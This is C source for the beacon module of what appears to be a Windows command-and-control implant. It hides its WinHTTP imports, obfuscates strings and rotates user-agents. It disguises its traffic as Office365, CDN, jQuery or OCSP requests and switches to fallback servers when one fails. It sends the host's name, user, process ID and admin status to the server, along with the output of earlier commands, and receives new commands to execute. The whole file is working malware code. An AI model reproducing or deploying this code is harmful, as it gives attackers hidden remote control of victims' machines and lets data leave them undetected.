/*
 * beacon.c — WinHTTP beacon: check-in, send result, receive command.
 *
 * WinHTTP is loaded at runtime via LoadLibrary to keep it out of the
 * static import table.  Only kernel32.dll appears in the PE import dir.
 *
 * Wire protocol (matches Go crypto.Manager):
 *   POST /beacon
 *   Content-Type: application/octet-stream
 *   User-Agent: <rotated from pool>
 *   Body: ImplantEncrypt(JSON payload)
 *
 *   Response body: ImplantDecrypt(body) → JSON with optional "command" key.
 */
#include "../include/implant.h"
#include "../include/obfstr.h"
#include <string.h>

/* ── WinHTTP function pointer table (defined here; extern'd from implant.h) */
pfnWinHttpOpen              pWinHttpOpen              = NULL;
pfnWinHttpConnect           pWinHttpConnect           = NULL;
pfnWinHttpOpenRequest       pWinHttpOpenRequest       = NULL;
pfnWinHttpSendRequest       pWinHttpSendRequest       = NULL;
pfnWinHttpReceiveResponse   pWinHttpReceiveResponse   = NULL;
pfnWinHttpQueryDataAvailable pWinHttpQueryDataAvailable = NULL;
pfnWinHttpReadData          pWinHttpReadData          = NULL;
pfnWinHttpCloseHandle       pWinHttpCloseHandle       = NULL;
pfnWinHttpSetOption         pWinHttpSetOption         = NULL;

/* ── UA rotation pool (matches Go agent UA pool) ─────────────────────────── */
static const char *s_ua_pool[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
};
#define UA_POOL_SIZE ((int)ARRAY_SIZE(s_ua_pool))

/* Current C2 server URL (may be rotated on failure) */
static char s_server_url[512] = {0};
static int  s_ua_idx = 0;

/* Fallback URLs — @@FALLBACK_URLS@@ is a comma-separated list baked in */
static char  s_fallback_buf[1024] = {0};
static char *s_fallback[8]        = {0};
static int   s_fallback_count     = 0;
static int   s_fallback_idx       = 0;

/* ── Module init ─────────────────────────────────────────────────────────── */

/*
 * Malleable C2 profile table — maps CFG_C2_PROFILE names to:
 *   endpoint path, extra request headers, and response content-type.
 * The "default" entry uses /beacon; others mimic legitimate service traffic.
 */
typedef struct {
    const char *name;
    const char *path;       /* e.g. "/api/v1/data"      */
    const char *headers;    /* extra WinHttp header line */
    const char *ct;         /* Content-Type value        */
} C2Profile;

static const C2Profile s_profiles[] = {
    /* name            path                         extra-headers                                        content-type              */
    { "default",      "/beacon",                   "Accept: */*\r\n",                                   "application/octet-stream" },
    { "office365",    "/common/oauth2/token",       "Accept: application/json\r\n",                     "application/x-www-form-urlencoded" },
    { "cdn",          "/cdn-cgi/trace",             "Accept-Encoding: gzip, deflate\r\n",               "application/octet-stream" },
    { "jquery",       "/jquery-3.7.1.min.js",       "Accept: text/javascript, */*\r\n",                 "application/javascript" },
    { "ocsp",         "/ocsp",                      "Accept: application/ocsp-response\r\n",            "application/ocsp-request" },
};
#define PROFILE_COUNT ((int)ARRAY_SIZE(s_profiles))

static const C2Profile *s_active_profile = &s_profiles[0];

static void SelectProfile(void) {
    const char *want = CFG_C2_PROFILE;
    if (!want || !want[0]) return;
    for (int i = 0; i < PROFILE_COUNT; i++) {
        if (strcmp(s_profiles[i].name, want) == 0) {
            s_active_profile = &s_profiles[i];
            return;
        }
    }
}

BOOL BeaconInit(void) {
    HMODULE h = LoadLibraryA(OBFSTR("winhttp.dll"));
    if (!h) return FALSE;
    SelectProfile();

#define RESOLVE(name) \
    p##name = (pfn##name)(FARPROC)GetProcAddress(h, #name); \
    if (!p##name) return FALSE;

    RESOLVE(WinHttpOpen)
    RESOLVE(WinHttpConnect)
    RESOLVE(WinHttpOpenRequest)
    RESOLVE(WinHttpSendRequest)
    RESOLVE(WinHttpReceiveResponse)
    RESOLVE(WinHttpQueryDataAvailable)
    RESOLVE(WinHttpReadData)
    RESOLVE(WinHttpCloseHandle)
    RESOLVE(WinHttpSetOption)
#undef RESOLVE

    /* Copy primary server URL */
    xsnprintf(s_server_url, sizeof(s_server_url), "%s", CFG_SERVER_URL);

    /* Parse fallback URLs */
    xsnprintf(s_fallback_buf, sizeof(s_fallback_buf), "%s", CFG_FALLBACK_URLS);
    char *tok = s_fallback_buf;
    for (int i = 0; i < 8 && *tok; i++) {
        s_fallback[s_fallback_count++] = tok;
        char *comma = tok;
        while (*comma && *comma != ',') comma++;
        if (*comma == ',') { *comma = '\0'; tok = comma + 1; }
        else break;
    }

    /* Random UA start index */
    s_ua_idx = (int)(RandDword() % (DWORD)UA_POOL_SIZE);
    return TRUE;
}

/* ── URL parsing ─────────────────────────────────────────────────────────── */

static void ParseURL(const char *url, WCHAR *host, int hostCap,
                     WCHAR *path, int pathCap, INTERNET_PORT *port, BOOL *https) {
    *https = FALSE;
    *port  = 443;

    const char *p = url;
    if (strncmp(p, "https://", 8) == 0) { *https = TRUE; p += 8; *port = 443; }
    else if (strncmp(p, "http://",  7) == 0) { p += 7; *port = 80; }

    /* host[:port] */
    const char *slash = p;
    while (*slash && *slash != '/' && *slash != ':') slash++;

    char hostbuf[256] = {0};
    int  hlen = (int)(slash - p);
    if (hlen > 255) hlen = 255;
    memcpy(hostbuf, p, hlen);
    StrToWstr(hostbuf, host, hostCap);

    if (*slash == ':') {
        slash++;
        *port = 0;
        while (*slash >= '0' && *slash <= '9') { *port = *port * 10 + (*slash - '0'); slash++; }
    }

    if (*slash == '/') StrToWstr(slash, path, pathCap);
    else               StrToWstr("/", path, pathCap);
}

/* ── Rotate to next C2 server on persistent failure ─────────────────────── */

static void RotateServer(void) {
    if (s_fallback_count == 0) return;
    xsnprintf(s_server_url, sizeof(s_server_url), "%s",
              s_fallback[s_fallback_idx % s_fallback_count]);
    s_fallback_idx++;
}

/* ── HTTP POST helper ────────────────────────────────────────────────────── */

static char *HttpPost(const char *url, const char *ua,
                       const char *body, DWORD bodyLen, DWORD *outLen) {
    WCHAR wHost[256] = {0};
    WCHAR wPath[512] = {0};
    INTERNET_PORT port = 443;
    BOOL https = FALSE;

    ParseURL(url, wHost, 256, wPath, 512, &port, &https);

    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    char *result = NULL;
    *outLen = 0;

    WCHAR wUA[256] = {0};
    StrToWstr(ua, wUA, 256);

    hSession = pWinHttpOpen(wUA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto done;

    /* Timeout: 10 s connect, 30 s send/receive */
    DWORD to = 10000;
    pWinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &to, sizeof(to));
    to = 30000;
    pWinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &to, sizeof(to));
    pWinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &to, sizeof(to));

    hConnect = pWinHttpConnect(hSession, wHost, port, 0);
    if (!hConnect) goto done;

    DWORD reqFlags = https ? WINHTTP_FLAG_SECURE : 0;
    hRequest = pWinHttpOpenRequest(hConnect, L"POST", wPath, NULL,
                                    WINHTTP_NO_REFERER,
                                    WINHTTP_DEFAULT_ACCEPT_TYPES, reqFlags);
    if (!hRequest) goto done;

    /* Accept self-signed TLS (lab use; remove for strict deployments) */
    if (https) {
        DWORD opts = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &opts, sizeof(opts));
    }

    /* Build header string using active profile's Content-Type */
    char hdrA[256];
    xsnprintf(hdrA, sizeof(hdrA), "Content-Type: %s\r\n%s",
              s_active_profile->ct, s_active_profile->headers);
    WCHAR hdrW[512] = {0};
    StrToWstr(hdrA, hdrW, 512);

    if (!pWinHttpSendRequest(hRequest,
                              hdrW,
                              (DWORD)-1L,
                              (LPVOID)body, bodyLen, bodyLen, 0))
        goto done;

    if (!pWinHttpReceiveResponse(hRequest, NULL)) goto done;

    /* Read response into heap buffer */
    DWORD avail = 0, read = 0, totalRead = 0;
    DWORD cap = 65536;
    result = (char *)ImplantAlloc(cap);
    if (!result) goto done;

    while (pWinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
        if (totalRead + avail + 1 > cap) {
            cap = totalRead + avail + 1 + 4096;
            char *tmp = (char *)ImplantAlloc(cap);
            if (!tmp) { ImplantFree(result); result = NULL; goto done; }
            memcpy(tmp, result, totalRead);
            ImplantFree(result);
            result = tmp;
        }
        if (!pWinHttpReadData(hRequest, result + totalRead, avail, &read)) break;
        totalRead += read;
    }
    if (result) {
        result[totalRead] = '\0';
        *outLen = totalRead;
    }

done:
    if (hRequest) pWinHttpCloseHandle(hRequest);
    if (hConnect) pWinHttpCloseHandle(hConnect);
    if (hSession) pWinHttpCloseHandle(hSession);
    return result;
}

/* ── Build beacon JSON payload ───────────────────────────────────────────── */

static char *BuildBeaconJSON(const AgentResult *last) {
    char *buf = (char *)ImplantAlloc(BEACON_BUF_MAX);
    if (!buf) return NULL;

    buf[0] = '{';
    int pos = 1;

    pos = JsonStr(buf, BEACON_BUF_MAX, pos, "id",       g_agent.agent_id);
    pos = JsonStr(buf, BEACON_BUF_MAX, pos, "hostname",  g_agent.hostname);
    pos = JsonStr(buf, BEACON_BUF_MAX, pos, "username",  g_agent.username);
    pos = JsonInt(buf, BEACON_BUF_MAX, pos, "pid",       g_agent.pid);
    pos = JsonBool(buf, BEACON_BUF_MAX, pos, "is_admin", g_agent.is_admin);
    pos = JsonStr(buf, BEACON_BUF_MAX, pos, "os",        "windows");
    pos = JsonStr(buf, BEACON_BUF_MAX, pos, "arch",      "amd64");

    if (last && last->cmd_id[0]) {
        /* Append result object */
        char outBuf[BEACON_BUF_MAX / 2];
        outBuf[0] = '{';
        int op = 1;
        op = JsonStr(outBuf, sizeof(outBuf), op, "id",        last->cmd_id);
        op = JsonBool(outBuf, sizeof(outBuf), op, "success",  last->success);
        op = JsonInt(outBuf, sizeof(outBuf), op, "exit_code", last->exit_code);
        op = JsonStr(outBuf, sizeof(outBuf), op, "output",    last->output ? last->output : "");
        if (op < (int)sizeof(outBuf) - 1) outBuf[op++] = '}';
        outBuf[op] = '\0';
        pos = JsonRaw(buf, BEACON_BUF_MAX, pos, "result", outBuf);
    }

    if (pos < BEACON_BUF_MAX - 1) buf[pos++] = '}';
    buf[pos] = '\0';
    return buf;
}

/* ── Parse command from response JSON ───────────────────────────────────── */

static BOOL ParseCommand(const char *json, AgentCommand *cmd) {
    if (!json || !cmd) return FALSE;
    memset(cmd, 0, sizeof(*cmd));

    char *id = JsonGetStr(json, "id");
    if (!id) return FALSE;
    xsnprintf(cmd->id, CMD_ID_LEN, "%s", id);
    ImplantFree(id);

    char *type = JsonGetStr(json, "type");
    if (!type) return FALSE;
    xsnprintf(cmd->type, CMD_TYPE_LEN, "%s", type);
    ImplantFree(type);

    /* args is a nested object — find the raw JSON for it */
    const char *argsStart = json;
    const char *pat = "\"args\"";
    while (*argsStart) {
        if (strncmp(argsStart, pat, 6) == 0) {
            argsStart += 6;
            while (*argsStart == ' ' || *argsStart == ':' || *argsStart == '\t') argsStart++;
            if (*argsStart == '{') {
                /* Copy nested object */
                int depth = 0, ai = 0;
                const char *p = argsStart;
                while (*p && ai < CMD_ARG_LEN - 1) {
                    cmd->args_json[ai++] = *p;
                    if (*p == '{') depth++;
                    else if (*p == '}') { depth--; if (depth == 0) { p++; break; } }
                    p++;
                }
                cmd->args_json[ai] = '\0';
            }
            break;
        }
        argsStart++;
    }
    if (!cmd->args_json[0]) xsnprintf(cmd->args_json, CMD_ARG_LEN, "{}");

    return TRUE;
}

/* ── Public: send beacon, receive optional command ───────────────────────── */

BOOL BeaconSend(const AgentResult *lastResult, AgentCommand *cmdOut) {
    if (cmdOut) memset(cmdOut, 0, sizeof(*cmdOut));

    /* Build plaintext JSON */
    char *json = BuildBeaconJSON(lastResult);
    if (!json) return FALSE;

    /* Encrypt */
    char *encrypted = ImplantEncrypt((const BYTE *)json, (DWORD)strlen(json));
    ImplantFree(json);
    if (!encrypted) return FALSE;

    /* Rotate UA */
    const char *ua = s_ua_pool[s_ua_idx % UA_POOL_SIZE];
    s_ua_idx = (s_ua_idx + 1) % UA_POOL_SIZE;

    /* Build endpoint from active malleable profile */
    char endpoint[560];
    xsnprintf(endpoint, sizeof(endpoint), "%s%s", s_server_url, s_active_profile->path);

    DWORD respLen = 0;
    char *resp = HttpPost(endpoint, ua, encrypted, (DWORD)strlen(encrypted), &respLen);
    ImplantFree(encrypted);

    if (!resp || respLen == 0) {
        ImplantFree(resp);
        RotateServer();
        return FALSE;
    }

    /* Decrypt response */
    DWORD plainLen = 0;
    BYTE *plain = ImplantDecrypt(resp, &plainLen);
    ImplantFree(resp);

    if (!plain) return TRUE;  /* no command, but beacon succeeded */

    /* Parse command if present */
    char *cmdJson = JsonGetStr((const char *)plain, "command");
    ImplantFree(plain);

    if (cmdJson && cmdJson[0] && cmdOut) {
        ParseCommand(cmdJson, cmdOut);
    }
    ImplantFree(cmdJson);
    return TRUE;
}
